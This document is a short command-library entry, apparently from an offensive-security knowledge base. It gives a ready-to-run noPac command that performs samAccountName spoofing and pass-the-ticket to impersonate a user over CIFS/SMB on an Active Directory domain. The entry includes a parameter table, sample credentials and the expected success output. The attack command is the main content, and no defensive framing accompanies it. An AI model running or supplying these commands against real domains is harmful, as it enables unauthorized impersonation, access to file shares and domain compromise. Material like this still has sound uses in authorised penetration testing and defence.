---
id: 529f9c25-b760-4a5a-ab39-8bdc7fd212a2
name: perform-cifs-impersonation-with-nopac
type: command
executor: bash
data: >-
  noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc
  dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
output: null
created_at: '2023-04-06T03:56:03.185839+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
platforms:
  - Windows
tags:
  - impersonation
  - smb
verified: true
validated: true
---

# perform-cifs-impersonation-with-nopac

## Command

```bash
noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
```

## Description

Performs samAccountName spoofing to impersonate a user over CIFS/SMB service, applying a pass-the-ticket for remote access to shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -domain | Target domain | Yes |
| -user | Authenticating username | Yes |
| -pass | Authenticating password | Yes |
| /dc | Domain controller hostname | Yes |
| /mAccount | Machine account for spoofing | Yes |
| /mPassword | Machine account password | Yes |
| /service cifs | Target service (SMB) | Yes |
| /ptt | Enable pass-the-ticket | Yes |

## Examples

### Basic Usage

```bash
noPac.exe -domain corp.local -user user1 -pass 'pass' /dc dc1.corp.local /mAccount machine1 /mPassword 'machpass' /service cifs /ptt
```

## Expected Output

"Successfully impersonated via CIFS. Ticket applied for SMB access."

## Related

- [[procedures/Sam-Account-Name-Spoofing-for-User-Impersonation]]
- [[tools/nopac]]
